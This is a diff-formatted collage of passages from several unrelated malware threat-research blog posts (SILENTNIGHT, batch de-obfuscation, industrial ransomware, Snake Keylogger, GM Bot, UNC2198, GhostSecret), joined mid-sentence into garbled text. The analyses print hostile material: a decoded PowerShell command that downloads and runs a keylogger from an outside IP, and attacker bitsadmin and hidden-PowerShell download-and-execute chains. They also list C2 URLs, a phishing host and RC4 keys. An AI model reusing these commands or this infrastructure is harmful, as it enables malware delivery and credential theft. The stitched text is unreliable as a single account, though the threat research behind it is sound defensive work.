-An analyzed sample of SILENTNIGHT downloaded from this URL had an MD5 hash of 9e616a1757cf1d40689f34d867dd742e, employed the RC4 key 'q23Cud3xsNf3', and was associated with the SILENTNIGHT botnet 'PLSPAM'.
-This botnet has been seen loading configuration files containing primarily U.S.- and Canada financial institution webinject targets.
-Furthermore, this sample was configured to connect to the following controller infrastructure: http://marchadvertisingnetwork4[.]com/post.php http://marchadvertisingnetwork5[.]com/post.php http://marchadvertisingnetwork6[.]com/post.php http://marchadvertisingnetwork7[.]com/post.php http://marchadvertisingnetwork8[.]com/post.php http://marchadvertisingnetwork9[.]com/post.php http://marchadvertisingnetwork10[.]com/post.php Figure 1: Example lure using CAD Figure 2:
-Example lure using AUD Figure 3:
-Malicious Word document Example Phishing Campaign Individuals at financial services organizations in the United States were sent emails with the subject line “Internal Guidance for Businesses Grant and loans in response to respond to COVID-19” (Figure 4).
-These emails had OpenDocument Presentation (.ODP) format attachments that, when opened in Microsoft PowerPoint or OpenOffice Impress, display a U.S. Small Business Administration (SBA) themed message (Figure 5) and an in-line link that redirects to an Office 365 phishing kit (Figure 6) hosted at https://tyuy56df-kind-giraffe-ok.mybluemix[.]net/. Figure 4:
-Email lure referencing business grants and loans Figure 5: SBA-themed message Figure 6: Office 365 phishing page Implications Malicious actors have always exploited users’ sense of urgency, fear, goodwill and mistrust to enhance their operations.
-The threat actors exploiting this crisis are not new, they are simply taking advantage of a particularly overtaxed target set that is urgently seeking new information.
-Users who are aware of this dynamic, and who approach any new information with cautious skepticism will be especially prepared to meet this challenge.
-Subscribe to Blogs Get email updates as new blog posts are added.
-
-
-When Daniel Bohannon released his excellent DOSfuscation paper, I was fascinated to see how tricks I used as a systems engineer could help attackers evade detection.
-I didn’t have much to contribute to this conversation until I had to analyze a hideously obfuscated batch file as part of my job on the FLARE malware queue.
-Previously, I released flare-qdb , which is a command-line and Python-scriptable debugger based on Vivisect.
-I previously wrote about how to use flare-qdb to instrument and modify malware behavior.
-Flare-qdb also made a guest appearance in Austin Baker and Jacob Christie’s SANS DFIR Summit 2017 briefing , inducing the Windows event log service to exclude process creation events.
-In this blog post, I will show how I used flare-qdb to bring “script block logging” to the Windows command interpreter.
-I will also share an Easter Egg that I found by flipping only a single bit in the process address space of cmd.exe.
-Finally, I will share the script that I added to flare-qdb so you can de-obfuscate malicious command scripts yourself by executing them (in a safe environment, of course).
-But first, I’ll talk about the analysis that led me to this solution.
-At First Glance Figure 1 shows a batch script (MD5 hash 6C8129086ECB5CF2874DA7E0C855F2F6) that has been obfuscated using the BatchEncryption tool referenced in Daniel Bohannon’s paper.
-This file does not appear in VirusTotal as of this writing, but its dropper does (the MD5 hash is ABD0A49FDA67547639EEACED7955A01A).
-My goal was to de-obfuscate this script and report on what the attacker was doing.
-Figure 1: Contents of XYNT.bat
-This 165k batch file is dropped as C:\\Windows\\Temp\\XYNT.bat and executed by its dropper.
-Its commands are built from environment variable substrings.
-Figure 2 shows how to use the ECHO command to decode the first command.
-Figure 2: Partial command decoding via the ECHO command The script uses hundreds of commands to set environment variables that are ultimately expanded to de-obfuscate malicious commands.
-A tedious approach to de-obfuscating this script would be to de-fang each command by prepending an ECHO statement to print each de-obfuscated command to the console.
-Unfortunately, although the ECHO command can “decode” each command, BatchEncryption needs the SET commands to be executed to decode future commands.
-To decode this script while allowing the full malicious functionality to run as expected, you would have to iteratively and carefully echo and selectively execute a few hundred obfuscated SET commands.
-The irony of BatchEncryption is that batch scripts are viewed as being easy to de-obfuscate, making binary code the safer place to hide logic from the prying eyes of network defenders.
-But BatchEncryption adds a formidable barrier to analysis by its extensive, layered use of environment variables to rebuild the original commands.
-Taking Cmd of the Situation I decided to see if it would be easier to instrument cmd.exe to log commands rather than de-obfuscating the script myself.
-To begin, I debugged cmd.exe, set a breakpoint on CreateProcessW, and executed a program from the command prompt.
-Figure 3 shows the call stack for CreateProcessW as cmd.exe executes notepad.
-Figure 3:
-Call stack for CreateProcessW in cmd.exe Starting from cmd!ExecPgm, I reviewed the disassembly of the above functions in cmd.exe to trace the origin of the command string up the call stack.
-I discovered cmd!Dispatch, which receives not a string but a structure with pointers to the command, arguments, and any I/O redirection information (such as redirecting the standard output or error streams of a program to a file or device).
-Testing revealed that these strings had all their environment variables expanded, which means we should be able to read the de-obfuscated commands from here.
-Figure 4 is an exploration of this structure in WinDbg after running the command \"echo hai > nul\".
-This command prints the word hai to the standard output stream but uses the right-angle bracket to redirect standard output to the NUL device, which discards all data.
-The orange boxes highlight non-null pointers that got my attention during analysis, and the arrows point to the commands I used to discover their contents.
-Figure 4: Exploring the interesting pointers in 2nd argument to cmd!Dispatch Because users can redirect multiple
-I/O streams in a single command, cmd.exe represents I/O redirection with a linked list.
-For example, the command in Listing 1 shows redirection of standard output (stream #1 is implicit) to shares.txt and standard error (stream #2 is explicitly referenced) to errors.txt.
-net use > shares.txt 2>errors.txt
-Listing 1: Command-line I/O redirection example Figure 5 shows the command data structure and the I/O redirection linked list in block diagram format.
-Figure 5: Command data structure diagram By inspection, I found that cmd!Dispatch is responsible for executing both shell built-ins and executable programs, so unlike breaking on CreateProcess, it will not miss commands that do not result in process creation.
-Based on these findings, I wrote a flare-qdb script to parse and dump commands as they are executed.
-Introducing De-DOSfuscator De-DOSfuscator uses flare-qdb and Vivisect to hook the Dispatch function in cmd.exe and parse commands from memory.
-The De-DOSfuscator script runs in a 64-bit Python 2 interpreter and dumps commands to both the console and a log file.
-The script comes with the latest version of flare-qdb and is installed as a Python entry point named dedosfuscator.exe.
-De-DOSfuscator relies on the location of the non-exported Dispatch function to log commands, and its location varies per system.
-For convenience, if an Internet connection is available, De-DOSfuscator automatically retrieves this function’s offset using Microsoft’s symbol server.
-To allow offline use, you can supply the path to a copy of cmd.exe from your offline machine to the --getoff switch to obtain this offset.
-You can then supply that output as the argument to the --useoff switch in your offline machine to inform De-DOSfuscator where the function is located.
-Alternately, you can use De-DOSfuscator with a downloaded PDB or a local symbol cache containing the correct symbols.Since at least 2017, there has been a significant increase in public disclosures of ransomware incidents impacting industrial production and critical infrastructure organizations.
-Well-known ransomware families like WannaCry, LockerGoga, MegaCortex, Ryuk, Maze, and now SNAKEHOSE (a.k.a.
-Snake / Ekans), have cost victims across a variety of industry verticals many millions of dollars in ransom and collateral costs.
-These incidents have also resulted in significant disruptions and delays to the physical processes that enable organizations to produce and deliver goods and services.
-While lots of information has been shared about the victims and immediate impacts of industrial sector ransomware distribution operations, the public discourse continues to miss the big picture.
-As financial crime actors have evolved their tactics from opportunistic to post-compromise ransomware deployment, we have observed an increase in adversaries’ internal reconnaissance that enables them to target systems that are vital to support the chain of production.
-As a result, ransomware infections—either affecting critical assets in corporate networks or reaching computers in OT networks—often result in the same outcome: insufficient or late supply of end products or services.
-Truly understanding the unique nuances of industrial sector ransomware distribution operations requires a combination of skillsets and visibility across both IT and OT systems.
-Using examples derived from our consulting engagements and threat research, we will explain how the shift to post-compromise ransomware operations is fueling adversaries’ ability to disrupt industrial operations.
-Industrial Sector Ransomware Distribution Poses Increasing Risk as Actors Move to Post-Compromise Deployment
-The traditional approach to ransomware attacks predominantly relies on a “shotgun” methodology that consists of indiscriminate campaigns spreading malware to encrypt files and data from a variety of victims.
-Actors following this model will extort victims for an average of $500 to $1,000 USD and hope to receive payments from as many individuals as possible.
-While early ransomware campaigns adopting this approach were often considered out of scope for OT security, recent campaigns targeting entire industrial and critical infrastructure organizations have moved toward adopting a more operationally complex post-compromise approach.
-In post-compromise ransomware incidents, a threat actor may still often rely on broadly distributed malware to obtain their initial access to a victim environment, but once on a network they will focus on gaining privileged access so they can explore the target networks and identify critical systems before deploying the ransomware.
-This approach also makes it possible for the attacker to disable security processes that would normally be enough to detect known ransomware indicators or behaviors.
-Actors cast wider nets that may impact critical systems, which  expand the scale and effectiveness of their end-stage operations by inflicting maximum pain on the victim.
-As a result, they are better positioned to negotiate and can often demand much higher ransoms—which are commonly commensurate with the victims’ perceived ability to pay and the value of the ransomed assets themselves.
-For more information, including technical detail, on similar activity, see our recent blog posts on FIN6 and TEMP.MixMaster .
-Figure 1: Comparison of indiscriminate vs. post-compromise ransomware approaches Historical incidents involving the opportunistic deployment of ransomware have often been limited to impacting individual computers, which occasionally included OT intermediary systems that were either internet-accessible, poorly segmented, or exposed to infected portable media.
-In 2017, we also observed campaigns such as NotPetya and BadRabbit, where wiper malware with worm-like capabilities were released to disrupt organizations while masquerading as ransomware.
-While these types of campaigns pose a threat to industrial production, the adoption of post-compromise deployment presents three major twists in the plot.
-As threat actors tailor their attacks to target specific industries or organizations, companies with high-availability requirements (e.g., public utilities, hospitals, and industrial manufacturing) and perceived abilities to pay ransoms (e.g., higher revenue companies) become prime targets.
-This represents an expansion of financial crime actors’ targeting of industries that process directly marketable information (e.g., credit card numbers or customer data) to include the monetization of production environments.
-As threat actors perform internal reconnaissance and move laterally across target networks before deploying ransomware, they are now better positioned to cast wide nets that impact the target’s most critical assets and negotiate from a privileged position.
-Most importantly, many of the tactics, techniques, and procedures (TTPs) often used by financial actors in the past, resemble those employed by high-skilled actors across the initial and middle stages of the attack lifecycle of past OT security incidents.
-Therefore, financial crime actors are likely capable of pivoting to and deploying ransomware in OT intermediary systems to further disrupt operations.
-Organized Financial Crime Actors Have Demonstrated an Ability to Disrupt OT Assets
-An actor’s capability to obtain financial benefits from post-compromise ransomware deployment depends on many factors, one of which is the ability to disrupt systems that are the most relevant to the core mission of the victim organizations.
-As a result, we can expect mature actors to gradually broaden their selection from only IT and business processes, to also OT assets monitoring and controlling physical processes.
-This is apparent in ransomware families such as SNAKEHOSE, which was designed to execute its payload only after stopping a series of processes that included some industrial software from vendors such as General Electric and Honeywell.
-At first glance, the SNAKEHOSE kill list appeared to be specifically tailored to OT environments due to the relatively small number of processes (yet high number of OT-related processes) identified with automated tools for initial triage.
-However, after manually extracting the list from the function that was terminating the processes, we determined that the kill list utilized by SNAKEHOSE actually targets over 1,000 processes.
-In fact, we have observed very similar process kill lists deployed alongside samples from other ransomware families, including LockerGoga, MegaCortex, and Maze.FortiGuard Labs Threat Research Report Affected platforms: Microsoft Windows Impacted parties: Windows Users Impact: Collects sensitive information from victims’ device Severity level :             Critical Fortinet’s FortiGuard Labs recently captured a Microsoft Excel sample from the wild that was used to spread malware .
-After researching its behaviors, I recognized it as a fresh variant of the Snake Keylogger malware.
-Snake Keylogger is a malware developed using .NET.
-It first appeared in late 2020 and focused on stealing sensitive information from a victim’s device, including saved credentials, the victim’s keystrokes, screenshots of the victim’s screen, and clipboard data.
-In July, 2021, Snake Keylogger first entered into a TOP 10 popular malware families report, meaning that the Snake Keylogger family is increasing its influence and impacting more people’s devices and sensitive data.
-In this threat research blog you will learn how the Snake Keylogger variant is downloaded and executed through a captured Excel sample, what techniques this variant uses to protect it from being analyzed, what sensitive information it steals from a victim’s machine, and how it submits that collected data to the attacker.
-Here we go.
-What the Captured Microsoft Excel Sample Looks Like This Excel sample, delivered as an attachment in a phishing email, contains malicious Macro VBA code.
-Figure 1.1 shows a screenshot of when it is opened.
-It displays a vague picture of a document and asks the victim to click the yellow button to get a clearer image.
-Once the yellow button “Enable Content” is clicked by victim, the malicious VBA code is executed in the background.
-The malicious macro project that contains the malicious VBA code is password protected so it cannot be viewed by the analyzer.
-However, we were able to modify its binary file to remove this restriction.
-Going through its code, a “Workbook_Activate()” method is automatically called when the document is opened.
-It writes a piece of PowerShell code from a local variable into a BAT file.
-Figure 1.2 shows partial VBA code of this method, where variable “s” holds the PowerShell code and \"Gqyztfbtsogpnruooqr.bat\" is the BAT file, which is finally executed by calling code “x = Shell(bat, 0)”.
-The bottom of Figure 1.2 shows the content of variable “s”, which contains the base64-encoded PowerShell code that is decoded by PowerShell.exe when it is executed.
-Below is the base64-decoded PowerShell code: $ProcName = \"Wheahmnfpgaqse.exe\"; (New-Object System.
+Introduction On Feb. 19, IBM XForce researchers released an intelligence report [ 1 ] stating that the source code for GM Bot was leaked to a crimeware forum in December 2015.
+GM Bot is a sophisticated Android malware family that emerged in the Russian-speaking cybercrime underground in late 2014.
+IBM also claimed that several Android malware families recently described in the security community were actually variants of GM Bot, including Bankosy[ 2 ], MazarBot[ 3 ], and the SlemBunk malware recently described by FireEye[ 4 , 5 ].
+Security vendors may differ in their definition of a malware “variant.”
+The term may refer to anything from almost identical code with slight modifications, to code that has superficial similarities (such as similar network traffic) yet is otherwise very different.
+Using IBM’s reporting, we compared their GM Bot samples to SlemBunk.
+Based on the disassembled code of these two families, we agree that there are enough code similarities to indicate that GM Bot shares a common origin with SlemBunk.
+Interestingly, our research led us to identify an earlier malware family named SimpleLocker – the first known file-encryption ransomware on Android [ 6 ] – that also shares a common origin with these banking trojan families.
+GM Bot and SlemBunk Our analysis showed that the four GM Bot samples referenced by IBM researchers all share the same major components as SlemBunk.
+Figure 1 of our earlier report [ 4 ] is reproduced here, which shows the major components of SlemBunk and its corresponding class names: ServiceStarter : An Android receiver that will be invoked once an app is launched or the device boots up.
+Its functionality is to start the monitoring service, MainService , in the background.
+MainService : An Android service that runs in the background and monitors all running processes on the device.
+It prompts the user with an overlay view that resembles the legitimate app when that app is launched.
+This monitoring service also communicates with a remote host by sending the initial device data and notifying of device status and app preferences.
+MessageReceiver :
+An Android receiver that handles incoming text messages.
+In addition to the functionality of intercepting the authentication code from the bank, this component also acts as the bot client for remote command and control (C2).
+MyDeviceAdminReceiver :
+A receiver that requests administrator access to the Android device the first time the app is launched.
+This makes the app more difficult to remove.
+Customized UI views: Activity classes that present fake login pages that mimic those of the real banking apps or social apps to phish for banking or social account credentials.
+Figure 1.
+Major components of SlemBunk malware family The first three GM Bot samples have the same package name as our SlemBunk sample.
+In addition, the GM Bot samples have five of the same major components, including the same component names, as the SlemBunk sample in Figure 1.
+The fourth GM Bot sample has a different initial package name, but unpacks the real payload at runtime.
+The unpacked payload has the same major components as the SlemBunk sample, with a few minor changes on the class names: MessageReceiver replaced with buziabuzia , and MyDeviceAdminReceiver replaced with MDRA .
+Figure 2.
+Code Structure Comparison between GM Bot and SlemBunk Figure 2 shows the code structure similarity between one GM Bot sample and one SlemBunk sample (SHA256 9425fca578661392f3b12e1f1d83b8307bfb94340ae797c2f121d365852a775e and SHA256 e072a7a8d8e5a562342121408493937ecdedf6f357b1687e6da257f40d0c6b27 for GM Bot and SlemBunk, respectively).
+From this figure, we can see that the five major components we discussed in our previous post [ 4 ] are also present in GM Bot sample.
+Other common classes include: Main , the launching activity of both samples.
+MyApplication , the application class that starts before any other activities of both samples.
+SDCardServiceStarter , another receiver that monitors the status of MainService and restarts it when it dies.
+Among all the above components and classes, MainService is the most critical one.
+It is started by class Main at the launching time, keeps working in the background to monitor the top running process, and overlays a phishing view when a victim app (e.g., some mobile banking app) is recognized.
+To keep MainService running continuously, malware authors added two receivers – ServiceStarter and SDCardServiceStarter – to check its status when particular system events are received.
+Both GM Bot and SlemBunk samples share the same architecture.
+Figure 3 shows the major code of class SDCardServiceStarter to demonstrate how GM Bot and SlemBunk use the same mechanism to keep MainService running.
+Figure 3.
+Method onReceive of SDCardServiceStarter for GM Bot and SlemBunk From this figure, we can see that GM Bot and SlemBunk use almost identical code to keep MainService running.
+Note that both samples check the country in system locale and avoid starting MainService when they find the country is Russia.
+The only difference is that GM Bot applies renaming obfuscation to some classes, methods and fields.
+For example, static variable “MainService;->a” in GM Bot has the same role as static variable “MainService;->isRunning” in SlemBunk.
+Malware authors commonly use this trick to make their code harder to understand.
+However this won’t change the fact that the underlying codes share the same origin.
+Figure 4 shows the core code of class MainService to demonstrate that GM Bot and SlemBunk actually have the same logic for main service.
+In Android, when a service is started its onCreate method will be called.
+In method onCreate of both samples, a static variable is first set to true.
+In GM Bot, this variable is named “a”, while in SlemBunk it is named “isRunning”.
+Then both will move forward to read an app particular preference.
+Note that the preferences in both samples have the same name: “AppPrefs”.
+The last tasks of these two main services are also the same.
+Specifically, in order to check whether any victim apps are running, a runnable thread is scheduled.
+If a victim app is running, a phishing view is overlaid on top of that of the victim app.
+The only difference here is also on the naming of the runnable thread.
+Class “d” in GM Bot and class “MainService$2” in SlemBunk are employed respectively to conduct the same credential phishing task.
+Figure 4.
+Class MainService for GM Bot and SlemBunk
+In summary, our investigation into the binary code similarities supports IBM’s assertion that GM Bot and SlemBunk share the same origin.
+SimpleLocker and SlemBunk IBM noted that GM Bot emerged in late 2014 in the Russian-speaking cybercrime underground.
+In our research, we noticed that an earlier piece of Android malware named SimpleLocker also has a code structure similar to SlemBunk and GM Bot.Mandiant Advanced Practices (AP) closely tracks the shifting tactics, techniques, and procedures (TTPs) of financially motivated groups who severely disrupt organizations with ransomware.
+In May 2020, FireEye released a blog post detailing intrusion tradecraft associated with the deployment of MAZE .
+As of publishing this post, we track 11 distinct groups that have deployed MAZE ransomware.
+At the close of 2020, we noticed a shift in a subset of these groups that have started to deploy EGREGOR ransomware in favor of MAZE ransomware following access acquired from ICEDID infections.
+Since its discovery in 2017 as a banking trojan, ICEDID evolved into a pernicious point of entry for financially motivated actors to conduct intrusion operations.
+In earlier years, ICEDID was deployed to primarily target banking credentials.
+In 2020 we observed adversaries using ICEDID more explicitly as a tool to enable access to impacted networks, and in many cases this was leading to the use of common post-exploitation frameworks and ultimately the deployment of ransomware.
+This blog post shines a heat lamp on the latest tradecraft of UNC2198, who used ICEDID infections to deploy MAZE or EGREGOR ransomware.
+Building an Igloo: ICEDID Infections Separate phases of intrusions are attributed to different uncategorized (UNC) groups when discrete operations such as obtaining access are not part of a contiguous operation.
+Pure “access operations” establish remote access into a target environment for follow on operations actioned by a separate group.
+A backdoor deployed to establish an initial foothold for another group is an example of an access operation.
+Between July and December 2020, an ICEDID phishing infection chain consisted of a multi-stage process involving MOUSEISLAND and PHOTOLOADER (Figure 1).
+Figure 1:
+Example UNC2420 MOUSEISLAND to ICEDID Infection Chain MOUSEISLAND is a Microsoft Word macro downloader used as the first infection stage and is delivered inside a password-protected zip attached to a phishing email (Figure 2).
+Based on our intrusion data from responding to ICEDID related incidents, the secondary payload delivered by MOUSEISLAND has been PHOTOLOADER, which acts as an intermediary downloader to install ICEDID.
+Mandiant attributes the MOUSEISLAND distribution of PHOTOLOADER and other payloads to UNC2420 , a distribution threat cluster created by Mandiant’s Threat Pursuit team.
+UNC2420 activity shares overlaps with the publicly reported nomenclature of “ Shathak ” or “ TA551 ”.
+Figure 2: UNC2420 MOUSEISLAND Phishing Email Ice, Ice, BEACON...UNC2198
+Although analysis is always ongoing, at the time of publishing this blog post, Mandiant tracks multiple distinct threat clusters (UNC groups) of various sizes that have used ICEDID as a foothold to enable intrusion operations.
+The most prominent of these threat clusters is UNC2198 , a group that has targeted organizations in North America across a breadth of industries.
+ 
+In at least five cases, UNC2198 acquired initial access from UNC2420 MOUSEISLAND to conduct intrusion operations.
+In 2020, Mandiant attributed nine separate intrusions to UNC2198.
+UNC2198’s objective is to monetize their intrusions by compromising victim networks with ransomware.
+In July 2020, Mandiant observed UNC2198 leverage network access provided by an ICEDID infection to encrypt an environment with MAZE ransomware.
+As the year progressed into October and November, we observed UNC2198 shift from deploying MAZE to using EGREGOR ransomware during another Incident Response engagement.
+Like MAZE, EGREGOR is operated using an affiliate model , where affiliates who deploy EGREGOR are provided with proceeds following successful encryption and extortion for payment.
+The UNC2198 cluster expanded over the course of more than six months.
+Mandiant’s December 2020 blog post on UNCs described the analytical tradecraft we use to merge and graduate clusters of activity.
+Merging UNCs is a substantial analytical practice in which indicators and tradecraft attributed to one group are scrutinized against another.
+Two former UNCs that shared similar modus operandi were eventually merged into UNC2198.
+The Snowball Effect of Attribution AP created UNC2198 based on a single intrusion in June 2020 involving ICEDID, BEACON, SYSTEMBC and WINDARC.
+UNC2198 compromised 32 systems in 26 hours during this incident; however, ransomware was not deployed.
+Throughout July 2020 we attributed three intrusions to UNC2198 from Incident Response engagements, including one resulting in the deployment of MAZE ransomware.
+In October 2020, a slew of activity at both Incident Response engagements and Managed Defense clients resulted in the creation of two new UNC groups, and another incident attributed to UNC2198.
+One of the new UNC groups created in October 2020 was given the designation UNC2374.
+UNC2374 began as its own distinct cluster where BEACON, WINDARC, and SYSTEMBC were observed during an incident at a Managed Defense customer.
+Initial similarities in tooling did not constitute a strong enough link to merge UNC2374 with UNC2198 yet.
+Two and a half months following the creation of UNC2374, we amassed enough data points to merge UNC2374 into UNC2198.
+Some of the data points used in merging UNC2374 into UNC2198 include: UNC2198 and UNC2374 Cobalt Strike Team Servers used self-signed certificates with the following subject on TCP port 25055: C = US, ST = CA, L = California, O = Oracle Inc, OU =
+Virtual Services, CN = oracle.com UNC2198 and UNC2374 deployed WINDARC malware to identical file paths: %APPDATA%\\teamviewers\\msi.dll
+The same code signing certificate used to sign an UNC2198 BEACON loader was used to sign two UNC2374 SYSTEMBC tunneler payloads.
+UNC2374 and UNC2198 BEACON C2 servers were accessed by the same victim system within a 10-minute time window during intrusion operations.
+The other UNC group created in October 2020 was given the designation UNC2414.
+Three separate intrusions were attributed to UNC2414, and as the cluster grew, we surfaced similarities between UNC2414 and UNC2198.
+A subset of the data points used to merge UNC2414 into UNC2198 include: UNC2198 and UNC2414 BEACON servers used self-signed certificates using the following subject on TCP port 25055: C = US, ST = CA, L = California, O = Oracle Inc, OU =
+Virtual Services, CN = oracle.com UNC2198 and UNC2414 installed BEACON as C:\\Windows\\int32.dll UNC2198 and UNC2414 installed the RCLONE utility as C:\\Perflogs\\rclone.exe UNC2198 and UNC2414 were proven to be financially motivated actors that had leveraged ICEDID as initial access: UNC2198 had deployed MAZE UNC2414 had deployed EGREGOR
+The merge between UNC2198 and UNC2414 was significant because it revealed UNC2198 has access to EGREGOR ransomware.
+The timing of the EGREGOR usage is also consistent with MAZE ransomware shutting down as reported by Mandiant Intelligence.
+Figure 3 depicts the timeline of related intrusions and merges into UNC2198.
+Figure 3: UNC2198 timeline UNC2198 Intrusion Flow: After Initial Access Expanding the UNC2198 cluster through multiple intrusions and merges with other UNC groups highlights the range of TTPs employed.
+We have pulled out some key data from all our UNC2198 intrusions to illustrate an amalgamation of capabilities used by the threat actor.
+Establish Foothold After obtaining access, UNC2198 has deployed additional malware using various techniques.
+For instance, UNC2198 used InnoSetup droppers to install a WINDARC backdoor on the target host.
+UNC2198 also used BITS Jobs and remote PowerShell downloads to download additional tools like SYSTEMBC for proxy and tunneler capabilities.
+Example commands for download and execution are: %COMSPEC% /C
+echo bitsadmin /transfer
+257e http://<REDACTED>/<REDACTED>.exe %APPDATA%<REDACTED>.exe & %APPDATA%<REDACTED>.exe & del %APPDATA%
+<REDACTED>.exe ^> %SYSTEMDRIVE%\\WINDOWS\\Temp\\FmpaXUHFennWxPIM.txt > \\WINDOWS\\Temp\\MwUgqKjEDjCMDGmC.bat & %COMSPEC% /C
+start %COMSPEC% /C
+\\WINDOWS\\Temp\\MwUgqKjEDjCMDGmC.bat %COMSPEC% /C
+echo powershell.exe -nop -w hidden -c (new-object System.
 Net.
-WebClient).
-DownloadFile (\"hxxp[:]//3[.]64[.]251[.]139/v3/2/Requests07520000652.exe\",\"$env:APPDATA\\$ProcName\"); Start-Process (\"$env:APPDATA\\$ProcName\")
-The PowerShell code is very simple and easy to understand.
-It downloads a file (“Requests07520000652.exe”) onto a victim’s device, places it at “%AppData%\\Wheahmnfpgaqse.exe\" by calling “DownloadFile()”, and executes it by calling “Start-Process()”.
-Snake Keylogger Downloader After some research, I learned that the file \"Wheahmnfpgaqse.exe\" is a downloader of Snake Keylogger, which is a .Net program.
-When it starts, it sleeps 21 seconds to bypass those sandboxes with a strategy of killing a sample process when a timeout of no-action is triggered.
-Twenty one seconds later, the downloader then invokes a function called “Consturctor()”, as you can see in Figure 2.1.
-It then invokes another function “Program.
-List_Types()”, where it downloads Snake Keylogger module from the link “hxxps[:]//store2[.]gofile[.]io/download/0283e6ba-afc6-4dcb-b2f4-3173d666e2c4/Huzeigtmvaplpinhoo.dll”, which is a RC4 encrypted DLL file.
-Next, it calls “ToRc()” function to RC4 decrypt it using a decryption key \"Dllzjn\".
-It then proceeds to load the decrypted Dll module (a .Net
-Dll file, called “Huzeigtmvaplpinhoo.dll”), and enumerates its export functions to find \"G6doICqoMU()\", which is invoked by executing “type.
-InvokeMember(\\\"G6doICqoMU\\\", BindingFlags.
-InvokeMethod, null, null, null)” in function Consturctor(), as shown in Figure 2.1.
-The decrypted .Net
-Dll is a dropper and installer of Snake Keylogger.
-Let’s dive into this module to see how it performs its tasks.
-Snake Keylogger Installer According to my analysis, the decrypted Dll module (“Huzeigtmvaplpinhoo.dll”) deploys Snake Keylogger onto a victim’s device and sets it as an auto-run program.
-It extracts an executable PE file into memory from the Resource directory and then performs process hollowing that injects the executable PE file into a newly created child process and executes it.
-I will explain in detail how it performs these functions in this section.
-1.
-Persistence Mechanism Figure 3.1 shows an outline of the decrypted Dll module (“Huzeigtmvaplpinhoo.dll”).
-As you can see, to prevent its code from being analyzed the file is obfuscated so that the class names, function names, and variable names are all randomly generated meaningless strings.
-This creates trouble for analysts when analyzing it.
-The full name of the export function “G6doICqoMU()” is “Huzeigtmvaplpinhoo!pXfqpio3clcAoFxTnfJ.CORFgLoyRGlurYwdwIh.
-G6doICqoMU()”.
-Again, for the same reason as before, it sleeps 35 seconds at the beginning of this function to bypass some malware analysis systems.
-Next, it works to make this Snake Keylogger persistent on the infected Windows.
-As we all know, a Windows system has a “Startup” folder inside the “Start Menu”.
-The programs inside this folder are started when Windows starts.
-The full path to this folder is defined in the system registry with a string value of “HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell
-Folders\\Startup” and “HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\Startup”.
-The value data of “Startup” is C:\\Users\\{UserName}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup” by default.
-This variant of Snake Keylogger changes both the values of “Startup” to other folders.
-Figure 3.2 shows the code changing the Windows startup folder to “C:\\Users\\M0YTes0Env\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\chsg\\” by calling the API SetValue().
-In the bottom half of Figure 3.2 you can see the content of the system registry path, value name, and new value data.
-“chsg” is a new folder created by Snake Keylogger.
-The program copies the Snake Keylogger file (the downloaded \"Wheahmnfpgaqse.exe\") into this folder and renames it as “sgosr.exe”.
-This ensures that Snake Keylogger will be started by the Windows system every time it starts.
-2.
-Extraction from Resource Although the content of Huzeigtmvaplpinhoo.dll only appears in memory, to analyze it I saved it into a local file.
-It has several resources in the Resource directory, as shown below in Figure 3.3.
-The process of extracting the payload file of Snake Keylogger is a little complicated.
-It uses a tricky way to load the resource.
-It has a local callback function defined by ResolveEventHandler that is registered to AppDomain.
-ResourceResolve, which is then called when it fails to load a resource by name.
-It looks like an exception handler to Windows SEH strategy to handle exceptions.
-In addition, it has another local callback function registered to AppDomain.
-AssemblyResolve, which is called when it fails to load an assembly (like a module) by name.
-Below is a pseudocode of registering a local resource resolve, where T9wOjU5ccxTJaVfUntn.
-Osc50oil0l is the local callback function.
-AppDomain.
-ResourceResolve += new ResolveEventHandler(T9wOjU5ccxTJaVfUntn.
-Osc50oil0l)
-Now, let’s see how Snake Keylogger solves this challenge—loading a nonexistent resource, which will trigger the resource loading failure.
-It plans to read a Resource named \"Qkxkikeg\" from the current module, which has no such named resource in the Resource directory, as you can see in Figure 3.3.
-A resource loading failure occurs and the registered local ResolveEventHandler function is called to solve this error.
-This then causes a loading assembly failure and its assembly resolve callback function is called.
-A while later, another PE file, decrypted from resource “{d977ee8c-85ce-4731-b9a1-323ba88c6eeb}‎”, appears in memory.
-It contains a resource with the name “Qkxkikeg”, which is the original request resource name, as shown in Figure 3.4.
-The payload of Snake Keylogger is just a compressed in GZIP format in the resource “Qkxkikeg” under the Resource directory “ClassLibrary1.Properties.
-Resources”.
-Figure 3.5 displays the GZIP data of the resource “Qkxkikeg” (reversed) on the left and the decompressed Snake Keylogger on the right side.
-3.
-Process Hollowing The program then creates a suspended child process and deploys the compressed Snake Keylogger payload into the child process.
-It then resumes the child process to run.
-Meanwhile, the parent process exits by calling the function Environment.
-Exit(0).
-According to the code in Figure 3.6, it is about to call API CreateProcess() to create the child process with Creation Flag 134217732U (0x8000004), which means CREATE_NO_WINDOW and CREATE_SUSPENDED.
-It then calls the API WriteProcessMemory() to copy the Snake Keylogger payload into the child process, section by section.
-It next calls SetThreadContext() to make the child process point to the entry point function of Snake Keylogger.
-Before the parent process exits, an API ResumeThread() is called to have the child process restored to run.
-Snake Keylogger Payload
-The code of the Snake Keylogger payload file is fully obfuscated, as shown in Figure 4.1, to protect it from being analyzed.By Ryan Sherstobitoff and Asheer Malhotra on Apr 24, 2018 McAfee Advanced Threat Research analysts have uncovered a global data reconnaissance campaign assaulting a wide number of industries including critical infrastructure, entertainment, finance, health care, and telecommunications.
-This campaign, dubbed Operation GhostSecret, leverages multiple implants, tools, and malware variants associated with the state-sponsored cyber group Hidden Cobra.
-The infrastructure currently remains active.
-In this post, we dive deeply into this campaign.
-For a brief overview of this threat, see “Global Malware Campaign Pilfers Data from Critical Infrastructure, Entertainment, Finance, Health Care, and Other Industries.”
-Our investigation into this campaign reveals that the actor used multiple malware implants, including an unknown implant with capabilities similar to Bankshot.
-From March 18 to 26 we observed the malware operating in multiple areas of the world.
-This new variant resembles parts of the Destover malware, which was used in the 2014 Sony Pictures attack.
-Furthermore, the Advanced Threat Research team has discovered Proxysvc, which appears to be an undocumented implant.
-We have also uncovered additional control servers that are still active and associated with these new implants.
-Based on our analysis of public and private information from submissions, along with product telemetry, it appears Proxysvc was used alongside the 2017 Destover variant and has operated undetected since mid-2017.
